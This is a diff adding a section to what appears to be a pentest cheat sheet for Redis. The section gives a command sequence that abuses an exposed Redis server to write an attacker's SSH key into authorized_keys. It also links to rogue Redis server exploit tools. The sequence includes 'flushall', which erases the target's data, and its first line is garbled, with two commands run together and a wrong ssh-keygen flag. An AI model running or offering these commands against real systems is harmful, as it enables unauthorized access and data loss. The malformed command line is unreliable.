@@ -38,4 +38,23 @@ redis-cli -h X.X.X.X config set dbfilename authorized_keys
 redis-cli -h X.X.X.X config set dir /var/lib/redis/.ssh
 redis-cli -h X.X.X.X save
 ```
+### Unauthorized SSH Access via Redis Exploitation
+
+This set of commands demonstrates an exploitation method that uses Redis to insert an SSH public key into the authorized_keys file of a Redis server, effectively allowing unauthorized SSH access to the server.
+
+```
+$ ssh-keygen -t ecdsa -s 521 -f key$ (echo -e "\n\n"; cat key.pub; echo -e "\n\n") > key.txt
+$ redis-cli -h X.X.X.X flushall
+$ cat key.txt | redis-cli -h X.X.X.X -x set pwn
+$ redis-cli -h X.X.X.X config set dbfilename authorized_keys
+$ redis-cli -h X.X.X.X config set dir /var/lib/redis/.ssh
+$ redis-cli -h X.X.X.X save
+```
+### Rogue Redis Server
+
+[+]
+https://github.com/n0b0dyCN/redis-rogue-server
+
+[-]
+https://github.com/Dliv3/redis-rogue-server/blob/master/README_EN.md
 
